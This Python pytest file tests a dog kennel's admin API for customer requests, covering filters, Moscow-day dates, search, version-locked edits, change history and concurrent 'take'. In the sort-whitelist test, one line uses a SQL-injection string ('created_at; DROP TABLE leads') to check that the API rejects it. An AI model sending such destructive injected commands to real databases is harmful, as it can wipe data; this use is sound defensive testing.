"""Admin request workflows: /api/v1/admin/leads (the one big base and its per-breed slices), the request card,
edits with optimistic locking, «Взять в работу», comments, manual requests, puppies, stats, meta and CSV export.

What matters for a kennel: a manager sees exactly the requests a filter promises (per breed, overdue, due today,
by Moscow days), two managers never overwrite each other or both «take» one request, every change is in the
card's history, closing / reopening keeps the data consistent, and an export is admin-only, opens in Russian
Excel, cannot carry a formula and is written to the audit log (152-ФЗ accountability)."""
from __future__ import annotations

import csv
import datetime as dt
import io
import time
import uuid
from concurrent.futures import ThreadPoolExecutor

import pytest
from sqlalchemy import text

from conftest import ORIGIN

UTC = dt.timezone.utc
MSK = dt.timezone(dt.timedelta(hours=3))  # Europe/Moscow has no DST
A = "/api/v1/admin"

PUP_MALTIPU = "maltipu-f1-krem-2026-08"            # «Пломбир», available
PUP_MALTIPU_2 = "maltipu-f1b-mini-ryzhij-2026-07"  # «Ириска», available
PUP_PUDEL = "toj-pudel-abrikos-2026-07"            # «Марго», available


# ---------------------------------------------------------------- helpers
def phone(n: int) -> str:
    """A distinct Russian number per person, in the site mask."""
    return f"+7 (9{n:02d}) 555-{n:02d}-{n:02d}"


def e164(n: int) -> str:
    return f"+79{n:02d}555{n:02d}{n:02d}"


def sql(db, stmt: str, **kw):
    """Run SQL in the test session and commit at once (never hold row locks the app would wait for)."""
    res = db.execute(text(stmt), kw)
    rows = [dict(r) for r in res.mappings()] if res.returns_rows else None
    db.commit()
    return rows


def new_lead(make_lead, db, **over) -> int:
    """POST a request through the public API; return its admin number (leads.id)."""
    pub = make_lead(**over)["id"]
    return sql(db, "SELECT id FROM leads WHERE public_id = :p", p=pub)[0]["id"]


def set_lead(db, lead_id: int, **cols) -> None:
    sets = ", ".join(f"{k} = :{k}" for k in cols)
    sql(db, f"UPDATE leads SET {sets} WHERE id = :lead_id", lead_id=lead_id, **cols)


def ids(r) -> list[int]:
    assert r.status_code == 200, r.text
    return [x["id"] for x in r.json()["items"]]


def listing(client, h, **params):
    return client.get(f"{A}/leads", headers=h, params=params)


def card(client, h, lead_id: int) -> dict:
    r = client.get(f"{A}/leads/{lead_id}", headers=h)
    assert r.status_code == 200, r.text
    return r.json()


def patch(client, h, lead_id: int, headers: dict | None = None, **body):
    return client.patch(f"{A}/leads/{lead_id}", json=body, headers={**h, **(headers or {})})


def ts(v: str | None) -> dt.datetime | None:
    return dt.datetime.fromisoformat(v) if v else None


def hist(db, lead_id: int) -> list[dict]:
    return sql(db, "SELECT action, old_value, new_value, comment, actor_id, actor_label FROM lead_history "
                   "WHERE lead_id = :i ORDER BY id", i=lead_id)


def moscow_today() -> dt.date:
    return dt.datetime.now(MSK).date()


# ---------------------------------------------------------------- auth on the admin area
@pytest.mark.parametrize("auth", [None, "Bearer nope", "Basic YW5uYTpwYXNz"])
def test_admin_lists_need_a_valid_bearer_token(client, make_lead, auth):
    make_lead()
    headers = {"Authorization": auth} if auth else {}
    for url in (f"{A}/leads", f"{A}/leads/counts", f"{A}/breeds", f"{A}/stats", f"{A}/export/leads.csv"):
        r = client.get(url, headers=headers)
        assert r.status_code == 401, (url, r.text)
        assert r.json()["error"]["code"] in ("unauthorized", "session_expired")
    # a token in the query string (ends up in logs) is never accepted
    assert client.get(f"{A}/leads", params={"token": "x", "access_token": "x"}).status_code == 401


# ---------------------------------------------------------------- list: pagination and sort
def test_list_pagination_contract_and_per_page_limit(client, admin_h, make_lead, db):
    made = [new_lead(make_lead, db, phone=phone(i)) for i in range(3)]
    r = listing(client, admin_h, per_page=2)
    body = r.json()
    assert set(body) == {"items", "total", "page", "per_page"}
    assert (body["total"], body["page"], body["per_page"], len(body["items"])) == (3, 1, 2, 2)
    r2 = listing(client, admin_h, per_page=2, page=2).json()
    assert (r2["total"], r2["page"], len(r2["items"])) == (3, 2, 1)
    assert sorted(ids(r) + [x["id"] for x in r2["items"]]) == sorted(made)  # no row lost or repeated across pages
    row = body["items"][0]
    assert {"id", "public_id", "version", "status", "breed", "phone_display", "children_count"} <= set(row)
    assert listing(client, admin_h, per_page=200).status_code == 200
    for bad in ({"per_page": 201}, {"per_page": 0}, {"page": 0}):
        r = listing(client, admin_h, **bad)
        assert r.status_code == 422, bad
        assert r.json()["error"]["code"] == "validation"


def test_sort_whitelist_and_default_newest_first(client, admin_h, make_lead, db):
    now = dt.datetime.now(UTC)
    a, b, c = (new_lead(make_lead, db, phone=phone(i)) for i in range(3))
    set_lead(db, a, created_at=now - dt.timedelta(hours=3))
    set_lead(db, b, created_at=now - dt.timedelta(hours=1))
    set_lead(db, c, created_at=now - dt.timedelta(hours=2))
    assert ids(listing(client, admin_h)) == [b, c, a]
    assert ids(listing(client, admin_h, sort="-created_at")) == [b, c, a]
    assert ids(listing(client, admin_h, sort="created_at")) == [a, c, b]
    for bad in ("name", "phone", "created_at; DROP TABLE leads", "-ip"):
        r = listing(client, admin_h, sort=bad)
        assert r.status_code == 422, bad
        assert r.json()["error"]["code"] == "validation" and "sort" in r.json()["error"]["fields"]
    assert sql(db, "SELECT count(*) AS n FROM leads")[0]["n"] == 3


# ---------------------------------------------------------------- list: filters (the per-breed bases)
def test_filter_breed_by_slug_key_and_general(client, admin_h, make_lead, db):
    m = new_lead(make_lead, db, phone=phone(1), breed="maltipu")
    b = new_lead(make_lead, db, phone=phone(2), breed="francuzskij-buldog")
    g = new_lead(make_lead, db, phone=phone(3), breed="undecided")
    assert ids(listing(client, admin_h, breed="francuzskij-buldog")) == [b]   # URL slug
    assert ids(listing(client, admin_h, breed="buldog")) == [b]               # stable key
    assert ids(listing(client, admin_h, breed="general")) == [g]              # no breed chosen
    assert sorted(ids(listing(client, admin_h, breed="maltipu,general"))) == sorted([m, g])
    assert sorted(ids(client.get(f"{A}/leads?breed=maltipu&breed=buldog", headers=admin_h))) == sorted([m, b])
    assert ids(listing(client, admin_h, breed="no-such-breed")) == []
    assert card(client, admin_h, g)["breed"] is None


def test_filter_status_multi_and_open_closed_groups(client, admin_h, make_lead, db):
    st = {}
    for i, s in enumerate(["new", "in_progress", "waitlist", "won", "lost", "spam"]):
        st[s] = new_lead(make_lead, db, phone=phone(i))
        set_lead(db, st[s], status=s, lost_reason="expensive" if s == "lost" else None)
    assert sorted(ids(listing(client, admin_h, status="new,won"))) == sorted([st["new"], st["won"]])
    assert sorted(ids(client.get(f"{A}/leads?status=new&status=lost", headers=admin_h))) == \
        sorted([st["new"], st["lost"]])
    assert sorted(ids(listing(client, admin_h, status="open"))) == \
        sorted([st["new"], st["in_progress"], st["waitlist"]])
    assert sorted(ids(listing(client, admin_h, status="closed"))) == sorted([st["won"], st["lost"], st["spam"]])
    assert sorted(ids(listing(client, admin_h, status="closed,new"))) == \
        sorted([st["won"], st["lost"], st["spam"], st["new"]])


def test_filter_kind_and_origin(client, admin_h, make_lead, db):
    price = new_lead(make_lead, db, phone=phone(1), kind="price")
    pup = new_lead(make_lead, db, phone=phone(2), kind="puppy", puppy=PUP_MALTIPU)
    r = client.post(f"{A}/leads", headers=admin_h, json={"origin": "phone", "name": "Ирина", "phone": phone(3),
                                                         "kind": "consult", "breed": "toj-pudel"})
    assert r.status_code == 201, r.text
    manual = r.json()["id"]
    assert ids(listing(client, admin_h, kind="puppy")) == [pup]
    assert sorted(ids(listing(client, admin_h, kind="price,consult"))) == sorted([price, manual])
    assert ids(listing(client, admin_h, origin="phone")) == [manual]
    assert sorted(ids(listing(client, admin_h, origin="site_form"))) == sorted([price, pup])


def test_filter_assignee_me_none_and_id(client, admin_h, manager_user, admin_user, make_lead, db):
    mine = new_lead(make_lead, db, phone=phone(1))
    olegs = new_lead(make_lead, db, phone=phone(2))
    nobody = new_lead(make_lead, db, phone=phone(3))
    set_lead(db, mine, assignee_id=admin_user.id)
    set_lead(db, olegs, assignee_id=manager_user.id)
    assert ids(listing(client, admin_h, assignee="me")) == [mine]
    assert ids(listing(client, admin_h, assignee="none")) == [nobody]
    assert ids(listing(client, admin_h, assignee=str(manager_user.id))) == [olegs]
    assert card(client, admin_h, olegs)["assignee"] == {"id": manager_user.id, "name": "Олег"}


def test_filter_overdue(client, admin_h, make_lead, db):
    now = dt.datetime.now(UTC)
    stale_new = new_lead(make_lead, db, phone=phone(1))          # nobody answered in 15 minutes
    fresh_new = new_lead(make_lead, db, phone=phone(2))          # 0 minutes old: not yet overdue
    missed_call = new_lead(make_lead, db, phone=phone(3))        # «call back at …» has passed
    closed = new_lead(make_lead, db, phone=phone(4))
    quiet = new_lead(make_lead, db, phone=phone(5))
    later = new_lead(make_lead, db, phone=phone(6))
    set_lead(db, stale_new, created_at=now - dt.timedelta(minutes=20))
    set_lead(db, missed_call, status="in_progress", next_contact_at=now - dt.timedelta(hours=1))
    set_lead(db, closed, status="won", created_at=now - dt.timedelta(days=1), next_contact_at=now - dt.timedelta(hours=1))
    set_lead(db, quiet, status="no_answer", created_at=now - dt.timedelta(days=1))
    set_lead(db, later, status="in_progress", created_at=now - dt.timedelta(days=1),
             next_contact_at=now + dt.timedelta(hours=2))
    child = new_lead(make_lead, db, phone=phone(1))              # repeat request of the stale one
    set_lead(db, child, created_at=now - dt.timedelta(minutes=18))
    assert sorted(ids(listing(client, admin_h, overdue="true"))) == sorted([stale_new, missed_call])
    assert fresh_new not in ids(listing(client, admin_h, overdue="true"))


def test_filter_due_today_uses_the_moscow_day(client, admin_h, make_lead, db):
    today = moscow_today()
    noon = dt.datetime.combine(today, dt.time(12, 0), tzinfo=MSK)
    early = dt.datetime.combine(today, dt.time(0, 30), tzinfo=MSK)      # 21:30 UTC of the previous UTC day
    t_noon, t_early, t_tomorrow, t_none = (new_lead(make_lead, db, phone=phone(i)) for i in range(4))
    set_lead(db, t_noon, status="in_progress", next_contact_at=noon)
    set_lead(db, t_early, status="in_progress", next_contact_at=early)
    set_lead(db, t_tomorrow, status="in_progress", next_contact_at=noon + dt.timedelta(days=1))
    assert sorted(ids(listing(client, admin_h, due_today="true"))) == sorted([t_noon, t_early])


def test_search_q_by_name_phone_digits_and_number(client, admin_h, make_lead, db):
    anna = new_lead(make_lead, db, name="Анна Петрова", phone="+7 (901) 111-22-33")
    boris = new_lead(make_lead, db, name="Борис", phone="+7 (902) 444-55-66")
    child = new_lead(make_lead, db, name="Борис", phone="+7 (902) 444-55-66", kind="consult")
    assert ids(listing(client, admin_h, q="анна")) == [anna]                     # case-insensitive, Cyrillic
    assert ids(listing(client, admin_h, q="ПЕТРОВ")) == [anna]
    assert sorted(ids(listing(client, admin_h, q="444-55"))) == sorted([boris, child])   # search finds repeats
    assert sorted(ids(listing(client, admin_h, q="8 902 444 55 66"))) == sorted([boris, child])
    assert ids(listing(client, admin_h, q=f"№{anna}")) == [anna]
    assert ids(listing(client, admin_h, q=f"#{child}")) == [child]
    assert ids(listing(client, admin_h, q="%")) == []                            # LIKE wildcards are escaped
    assert ids(listing(client, admin_h, q="_")) == []
    assert listing(client, admin_h, q="x" * 101).status_code == 422


def test_created_from_to_are_moscow_dates(client, admin_h, make_lead, db):
    late = new_lead(make_lead, db, phone=phone(1))     # 23:30 UTC on 10 March = 02:30 on 11 March in Moscow
    evening = new_lead(make_lead, db, phone=phone(2))  # 20:00 UTC on 10 March = 23:00 on 10 March in Moscow
    set_lead(db, late, created_at=dt.datetime(2026, 3, 10, 23, 30, tzinfo=UTC))
    set_lead(db, evening, created_at=dt.datetime(2026, 3, 10, 20, 0, tzinfo=UTC))
    assert ids(listing(client, admin_h, created_from="2026-03-11", created_to="2026-03-11")) == [late]
    assert ids(listing(client, admin_h, created_from="2026-03-10", created_to="2026-03-10")) == [evening]
    assert ids(listing(client, admin_h, created_to="2026-03-10")) == [evening]
    assert sorted(ids(listing(client, admin_h, created_from="2026-03-10"))) == sorted([late, evening])
    assert listing(client, admin_h, created_from="10.03.2026").status_code == 422


def test_repeat_requests_hidden_unless_include_children_and_shown_in_card(client, admin_h, make_lead, db):
    parent = new_lead(make_lead, db, phone=phone(1), kind="price")
    child = new_lead(make_lead, db, phone=phone(1), kind="puppy", puppy=PUP_MALTIPU)
    assert ids(listing(client, admin_h)) == [parent]
    row = listing(client, admin_h).json()["items"][0]
    assert row["children_count"] == 1
    assert sorted(ids(listing(client, admin_h, include_children="true"))) == sorted([parent, child])
    d = card(client, admin_h, parent)
    assert [c["id"] for c in d["children"]] == [child]
    assert d["children"][0]["status"] == "duplicate" and d["children"][0]["parent_id"] == parent
    assert d["other_leads"] == []                       # a child is not «another request» of the person
    assert [h["action"] for h in d["history"]] == ["created", "repeat"]


# ---------------------------------------------------------------- counts and breed tabs
def test_counts_group_by_breed_and_status_includes_general(client, admin_h, make_lead, db):
    m1 = new_lead(make_lead, db, phone=phone(1), breed="maltipu")
    m2 = new_lead(make_lead, db, phone=phone(2), breed="maltipu")
    new_lead(make_lead, db, phone=phone(3), breed="buldog")
    new_lead(make_lead, db, phone=phone(4), breed="undecided")
    new_lead(make_lead, db, phone=phone(1), breed="maltipu", kind="consult")   # repeat: not counted
    w = new_lead(make_lead, db, phone=phone(5), breed="toj-pudel")
    set_lead(db, m2, status="in_progress")
    set_lead(db, w, status="won")
    r = client.get(f"{A}/leads/counts", headers=admin_h, params={"group_by": "breed,status"})
    assert r.status_code == 200, r.text
    cells = {(c["breed"], c["status"]): c["count"] for c in r.json()}
    assert cells == {("maltipu", "new"): 1, ("maltipu", "in_progress"): 1, ("buldog", "new"): 1,
                     ("general", "new"): 1, ("pudel", "won"): 1}
    r = client.get(f"{A}/leads/counts", headers=admin_h, params={"group_by": "breed", "status": "open"})
    assert {c["breed"]: c["count"] for c in r.json()} == {"maltipu": 2, "buldog": 1, "general": 1}
    assert m1


def test_breeds_endpoint_counters_per_base(client, admin_h, make_lead, db):
    now = dt.datetime.now(UTC)
    a = new_lead(make_lead, db, phone=phone(1), breed="maltipu")
    b = new_lead(make_lead, db, phone=phone(2), breed="maltipu")
    c = new_lead(make_lead, db, phone=phone(3), breed="maltipu")
    new_lead(make_lead, db, phone=phone(1), breed="maltipu", kind="consult")   # repeat: not counted
    new_lead(make_lead, db, phone=phone(4), breed="undecided")
    set_lead(db, b, status="in_progress", next_contact_at=now - dt.timedelta(minutes=5))
    set_lead(db, c, status="lost", lost_reason="expensive")
    r = client.get(f"{A}/breeds", headers=admin_h)
    assert r.status_code == 200, r.text
    by = {x["key"]: x for x in r.json()}
    assert list(by) == ["maltipu", "buldog", "pudel", "kolli", "general"]
    assert {k: by["maltipu"][k] for k in ("total", "open", "new", "overdue")} == \
        {"total": 3, "open": 2, "new": 1, "overdue": 1}
    assert (by["general"]["total"], by["general"]["view"], by["general"]["slug"]) == (1, "leads_general", None)
    assert by["buldog"]["slug"] == "francuzskij-buldog" and by["buldog"]["total"] == 0
    assert a


def test_breeds_overdue_badge_matches_overdue_filter(client, admin_h, make_lead, db):
    now = dt.datetime.now(UTC)
    stale = new_lead(make_lead, db, phone=phone(1), breed="maltipu")
    late_call = new_lead(make_lead, db, phone=phone(2), breed="maltipu")
    set_lead(db, stale, created_at=now - dt.timedelta(minutes=40))
    set_lead(db, late_call, status="in_progress", next_contact_at=now - dt.timedelta(minutes=5))
    listed = listing(client, admin_h, breed="maltipu", overdue="true").json()["total"]
    assert listed == 2
    badge = {x["key"]: x for x in client.get(f"{A}/breeds", headers=admin_h).json()}["maltipu"]["overdue"]
    assert badge == listed


# ---------------------------------------------------------------- the request card
def test_card_other_leads_across_breeds_history_and_links(client, admin_h, make_lead, db):
    m = new_lead(make_lead, db, phone="+7 (901) 111-22-33", contact="telegram", breed="maltipu")
    b = new_lead(make_lead, db, phone="8 901 111 22 33", contact="whatsapp", breed="francuzskij-buldog")
    stranger = new_lead(make_lead, db, phone=phone(9), breed="maltipu")
    d = card(client, admin_h, m)
    assert d["phone"] == "+79011112233" and d["phone_display"] == "+7 (901) 111-22-33"
    assert [o["id"] for o in d["other_leads"]] == [b]
    assert d["other_leads"][0]["breed"]["key"] == "buldog"
    assert stranger not in [o["id"] for o in d["other_leads"]]
    assert [(h["action"], h["actor_label"], h["new_value"]) for h in d["history"]] == [("created", "Сайт", "new")]
    assert d["links"]["tel"] == "tel:+79011112233"
    assert d["links"]["whatsapp"] == "https://wa.me/79011112233"
    assert d["links"]["telegram"].startswith("https://t.me/")
    assert d["links"]["preferred"] == d["links"]["telegram"]
    assert card(client, admin_h, b)["links"]["preferred"] == "https://wa.me/79011112233"
    assert d["consent_version"] and d["consent_at"]
    assert client.get(f"{A}/leads/999999", headers=admin_h).status_code == 404


def _events(client, vid, sid, *events):
    r = client.post("/api/v1/events", json={"visitor_id": vid, "session_id": sid, "landing": "/maltipu/",
                                             "events": list(events)})
    assert r.status_code == 202, r.text
    assert r.json()["accepted"] == len(events)


def test_card_journey_shows_site_activity_before_the_request(client, admin_h, make_lead, db):
    vid, sid = str(uuid.uuid4()), str(uuid.uuid4())
    now_ms = int(time.time() * 1000)
    _events(client, vid, sid,
            {"type": "page_view", "path": "/maltipu/", "ts": now_ms - 180_000, "data": {"title": "Мальтипу"}},
            {"type": "page_view", "path": f"/shchenki/{PUP_MALTIPU}/", "ts": now_ms - 60_000})
    lead = new_lead(make_lead, db, visitor_id=vid, session_id=sid, kind="puppy", puppy=PUP_MALTIPU)
    # what the person did after the request is not «the way to the request»
    _events(client, vid, sid, {"type": "page_view", "path": "/kontakty/", "ts": now_ms + 240_000})
    j = card(client, admin_h, lead)["journey"]
    assert j is not None
    assert [p["path"] for p in j["pages_before"]] == [f"/shchenki/{PUP_MALTIPU}/", "/maltipu/"]
    assert j["puppies_viewed"] == [PUP_MALTIPU]
    assert "maltipu" in j["breeds_viewed"]
    assert j["visits"] == 1
    assert j["first_landing"] == "/maltipu/"
    assert j["days_to_request"] == 0


def test_journey_is_null_when_linking_site_activity_is_off(client, admin_h, make_lead, db, settings):
    vid, sid = str(uuid.uuid4()), str(uuid.uuid4())
    _events(client, vid, sid, {"type": "page_view", "path": "/maltipu/", "ts": int(time.time() * 1000) - 60_000})
    lead = new_lead(make_lead, db, visitor_id=vid, session_id=sid)
    assert card(client, admin_h, lead)["journey"] is not None
    settings.link_site_activity = False
    assert card(client, admin_h, lead)["journey"] is None
    contact_id = card(client, admin_h, lead)["contact_id"]
    assert client.get(f"{A}/contacts/{contact_id}/events", headers=admin_h).json() == []
    # and a request sent while it is off is not linked to the browser at all
    vid2 = str(uuid.uuid4())
    lead2 = new_lead(make_lead, db, phone=phone(2), visitor_id=vid2, session_id=str(uuid.uuid4()))
    assert sql(db, "SELECT visitor_id, session_id FROM leads WHERE id = :i", i=lead2) == \
        [{"visitor_id": None, "session_id": None}]


# ---------------------------------------------------------------- PATCH: optimistic locking
def test_patch_needs_a_version_and_refuses_a_stale_one(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    r = patch(client, admin_h, lead, status="in_progress")
    assert r.status_code == 428 and r.json()["error"]["code"] == "version_required"
    assert card(client, admin_h, lead)["status"] == "new"
    r = patch(client, admin_h, lead, version=1, status="in_progress")
    assert r.status_code == 200, r.text
    assert (r.json()["version"], r.json()["status"]) == (2, "in_progress")
    # a second manager saves the card they opened before that change
    r = patch(client, admin_h, lead, version=1, status="no_answer")
    assert r.status_code == 409
    err = r.json()["error"]
    assert (err["code"], err["current_version"]) == ("version_conflict", 2)
    d = card(client, admin_h, lead)
    assert (d["status"], d["version"]) == ("in_progress", 2)
    assert [h["action"] for h in d["history"]] == ["created", "status"]
    # extra fields (phone, name …) cannot be changed through PATCH
    assert patch(client, admin_h, lead, version=2, phone="+79990000000").status_code == 422
    assert patch(client, admin_h, lead, version=2, name="Кто-то").status_code == 422


def test_patch_accepts_if_match_header(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    r = patch(client, admin_h, lead, headers={"If-Match": '"1"'}, comment="Позвонила, ждёт фото")
    assert r.status_code == 200, r.text
    assert r.json()["version"] == 2
    r = patch(client, admin_h, lead, headers={"If-Match": 'W/"2"'}, status="in_progress")
    assert r.status_code == 200 and r.json()["version"] == 3
    r = patch(client, admin_h, lead, headers={"If-Match": "2"}, status="waitlist")
    assert r.status_code == 409 and r.json()["error"]["current_version"] == 3
    r = patch(client, admin_h, lead, headers={"If-Match": "abc"}, status="waitlist")
    assert r.status_code == 422
    assert card(client, admin_h, lead)["status"] == "in_progress"


# ---------------------------------------------------------------- PATCH: status rules
def test_lost_needs_a_reason_and_the_reason_goes_when_reopened(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    r = patch(client, admin_h, lead, version=1, status="lost")
    assert r.status_code == 422 and "lost_reason" in r.json()["error"]["fields"]
    d = card(client, admin_h, lead)
    assert (d["status"], d["version"]) == ("new", 1)      # a refused edit does not use up the version
    assert [h["action"] for h in d["history"]] == ["created"]
    r = patch(client, admin_h, lead, version=1, status="lost", lost_reason="bought_elsewhere")
    assert r.status_code == 200, r.text
    d = r.json()
    assert (d["status"], d["lost_reason"]) == ("lost", "bought_elsewhere") and d["closed_at"]
    r = patch(client, admin_h, lead, version=2, status="in_progress")
    assert r.status_code == 200, r.text
    assert (r.json()["lost_reason"], r.json()["closed_at"]) == (None, None)
    r = patch(client, admin_h, lead, version=3, lost_reason="expensive")    # not lost: no reason allowed
    assert r.status_code == 422 and "lost_reason" in r.json()["error"]["fields"]
    r = patch(client, admin_h, lead, version=3, status="duplicate")        # only a repeat request is a duplicate
    assert r.status_code == 422


def test_lost_reason_is_cleared_when_moved_to_spam(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    assert patch(client, admin_h, lead, version=1, status="lost", lost_reason="expensive").status_code == 200
    r = patch(client, admin_h, lead, version=2, status="spam")
    assert r.status_code == 200, r.text
    assert r.json()["status"] == "spam"
    assert r.json()["lost_reason"] is None


def test_spam_reason_is_cleared_when_reopened(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    r = patch(client, admin_h, lead, version=1, status="spam")
    assert r.status_code == 200 and r.json()["spam_reason"] == "manual"
    r = patch(client, admin_h, lead, version=2, status="in_progress")
    assert r.status_code == 200, r.text
    assert r.json()["spam_reason"] is None


def test_closed_at_and_first_response_at(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    d = card(client, admin_h, lead)
    assert (d["first_response_at"], d["closed_at"]) == (None, None)
    r = patch(client, admin_h, lead, version=1, next_contact_at="2030-01-15T10:00:00+03:00")
    first = ts(r.json()["first_response_at"])
    assert first is not None and r.json()["closed_at"] is None
    for v, closed in ((2, "won"), (4, "spam")):
        r = patch(client, admin_h, lead, version=v, status=closed)
        assert r.status_code == 200, r.text
        assert r.json()["closed_at"] is not None, closed
        r = patch(client, admin_h, lead, version=v + 1, status="reserved")
        assert r.status_code == 200, r.text
        assert r.json()["closed_at"] is None
    assert ts(card(client, admin_h, lead)["first_response_at"]) == first     # the first answer stays the first


# ---------------------------------------------------------------- PATCH: breed and puppy
def test_breed_change_drops_a_puppy_of_another_breed(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db, kind="puppy", puppy=PUP_MALTIPU)
    d = card(client, admin_h, lead)
    assert (d["breed"]["key"], d["puppy"]["slug"]) == ("maltipu", PUP_MALTIPU)
    r = patch(client, admin_h, lead, version=1, breed="toj-pudel")
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["breed"]["key"] == "pudel" and d["puppy"] is None
    assert sql(db, "SELECT puppy_id FROM leads WHERE id = :i", i=lead) == [{"puppy_id": None}]
    actions = {h["action"]: (h["old_value"], h["new_value"]) for h in d["history"]}
    assert actions["breed"] == ("Мальтипу", "Той-пудель")
    assert actions["puppy"] == ("Пломбир", "—")
    assert ids(listing(client, admin_h, breed="pudel")) == [lead]                 # moved to the other base
    assert ids(listing(client, admin_h, breed="maltipu")) == []
    # breed "" moves the request to the general base
    r = patch(client, admin_h, lead, version=2, breed="")
    assert r.status_code == 200 and r.json()["breed"] is None
    assert ids(listing(client, admin_h, breed="general")) == [lead]


def test_breed_change_also_removes_the_request_from_the_old_puppys_queue(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db, kind="puppy", puppy=PUP_MALTIPU)
    assert [x["id"] for x in client.get(f"{A}/puppies/{PUP_MALTIPU}/leads", headers=admin_h).json()] == [lead]
    assert patch(client, admin_h, lead, version=1, breed="toj-pudel").status_code == 200
    d = card(client, admin_h, lead)
    assert (d["puppy_slug"], d["puppy_name"]) == (None, None)
    assert client.get(f"{A}/puppies/{PUP_MALTIPU}/leads", headers=admin_h).json() == []
    assert ids(listing(client, admin_h, puppy=PUP_MALTIPU)) == []


def test_puppy_change_sets_the_breed_and_unknown_values_are_refused(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db, breed="maltipu")
    r = patch(client, admin_h, lead, version=1, puppy=PUP_PUDEL)
    assert r.status_code == 200, r.text
    d = r.json()
    assert (d["breed"]["key"], d["puppy"]["slug"], d["puppy_slug"], d["puppy_name"]) == \
        ("pudel", PUP_PUDEL, PUP_PUDEL, "Марго")
    assert {"breed", "puppy"} <= {h["action"] for h in d["history"]}
    for body, field in (({"puppy": "no-such-puppy"}, "puppy"), ({"breed": "taksa"}, "breed")):
        r = patch(client, admin_h, lead, version=2, **body)
        assert r.status_code == 422, body
        assert field in r.json()["error"]["fields"]
    d = card(client, admin_h, lead)
    assert (d["version"], d["breed"]["key"], d["puppy"]["slug"]) == (2, "pudel", PUP_PUDEL)
    # puppy "" keeps the breed, drops the puppy
    r = patch(client, admin_h, lead, version=2, puppy="")
    assert r.status_code == 200
    assert (r.json()["breed"]["key"], r.json()["puppy"], r.json()["puppy_slug"]) == ("pudel", None, None)


# ---------------------------------------------------------------- PATCH: history
def test_every_patch_change_is_in_the_history(client, admin_h, admin_user, manager_user, make_lead, db):
    lead = new_lead(make_lead, db)
    r = patch(client, admin_h, lead, version=1, status="in_progress", assignee_id=manager_user.id,
              next_contact_at="2026-11-02T10:00:00", comment="Хотят девочку")
    assert r.status_code == 200, r.text
    d = r.json()
    # a time without an offset is Moscow time, as the panel shows it
    assert ts(d["next_contact_at"]) == dt.datetime(2026, 11, 2, 7, 0, tzinfo=UTC)
    rows = [h for h in hist(db, lead) if h["action"] != "created"]
    got = {h["action"]: h for h in rows}
    assert set(got) == {"status", "assignee", "next_contact", "comment"}
    assert (got["status"]["old_value"], got["status"]["new_value"]) == ("new", "in_progress")
    assert (got["assignee"]["old_value"], got["assignee"]["new_value"]) == ("—", "Олег")
    assert got["comment"]["comment"] == "Хотят девочку"
    assert all(h["actor_id"] == admin_user.id and h["actor_label"] == "Анна" for h in rows)
    assert client.get(f"{A}/leads/{lead}/history", headers=admin_h).json() == d["history"]
    # an unknown manager is refused, nothing written
    r = patch(client, admin_h, lead, version=2, assignee_id=987654)
    assert r.status_code == 422 and "assignee_id" in r.json()["error"]["fields"]
    assert len(hist(db, lead)) == 5


def test_sale_amount_change_is_in_the_history(client, admin_h, make_lead, db):
    lead = new_lead(make_lead, db)
    assert patch(client, admin_h, lead, version=1, status="won").status_code == 200
    n = len(hist(db, lead))
    r = patch(client, admin_h, lead, version=2, sale_amount="120000")
    assert r.status_code == 200, r.text
    assert float(r.json()["sale_amount"]) == 120000.0
    assert len(hist(db, lead)) == n + 1


# ---------------------------------------------------------------- take & comments
def test_take_first_wins_second_gets_409(client, admin_h, manager_h, admin_user, make_lead, db):
    lead = new_lead(make_lead, db)
    r = client.post(f"{A}/leads/{lead}/take", headers=admin_h)
    assert r.status_code == 200, r.text
    d = r.json()
    assert (d["assignee"]["id"], d["status"], d["version"]) == (admin_user.id, "in_progress", 2)
    assert d["first_response_at"] is not None
    r = client.post(f"{A}/leads/{lead}/take", headers=manager_h)
    assert r.status_code == 409
    assert (r.json()["error"]["code"], r.json()["error"]["assignee"]) == ("already_taken", "Анна")
    assert card(client, admin_h, lead)["assignee"]["id"] == admin_user.id
    assert [(h["action"], h["new_value"]) for h in hist(db, lead) if h["action"] == "assignee"] == \
        [("assignee", "Анна")]
    # a request not in «new» keeps its status when taken
    other = new_lead(make_lead, db, phone=phone(2))
    set_lead(db, other, status="no_answer")
    r = client.post(f"{A}/leads/{other}/take", headers=manager_h)
    assert r.status_code == 200 and r.json()["status"] == "no_answer"
    assert client.post(f"{A}/leads/999999/take", headers=manager_h).status_code in (404, 409)


def test_take_at_the_same_moment_has_exactly_one_winner(client, admin_h, manager_h, make_lead, db):
    for i in range(3):
        lead = new_lead(make_lead, db, phone=phone(i))
        with ThreadPoolExecutor(2) as pool:
            codes = sorted(pool.map(lambda h: client.post(f"{A}/leads/{lead}/take", headers=h).status_code,
                                    [admin_h, manager_h]))
        assert codes == [200, 409]
        assert len([h for h in hist(db, lead) if h["action"] == "assignee"]) == 1
        assert sql(db, "SELECT version FROM leads WHERE id = :i", i=lead) == [{"version": 2}]


def test_take_records_the_status_change_in_history(client, manager_h, make_lead, db):
    lead = new_lead(make_lead, db)
    assert client.post(f"{A}/leads/{lead}/take", headers=manager_h).status_code == 200
    statuses = [(h["old_value"], h["new_value"]) for h in hist(db, lead) if h["action"] == "status"]
    assert statuses == [("new", "in_progress")]


def test_comment_is_history_bumps_version_and_counts_as_a_response(client, manager_h, manager_user, make_lead, db):
    lead = new_lead(make_lead, db)
    r = client.post(f"{A}/leads/{lead}/comments", headers=manager_h, json={"text": "  Перезвонить после 18:00  "})
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["version"] == 2 and d["first_response_at"] is not None
    last = d["history"][-1]
    assert (last["action"], last["comment"], last["actor_id"], last["actor_label"]) == \
        ("comment", "Перезвонить после 18:00", manager_user.id, "Олег")
    # a stale card can no longer be saved over the comment
    assert patch(client, manager_h, lead, version=1, status="in_progress").status_code == 409
    for bad in ({"text": "   "}, {"text": ""}, {"text": "x" * 4001}, {}):
        assert client.post(f"{A}/leads/{lead}/comments", headers=manager_h, json=bad).status_code == 422
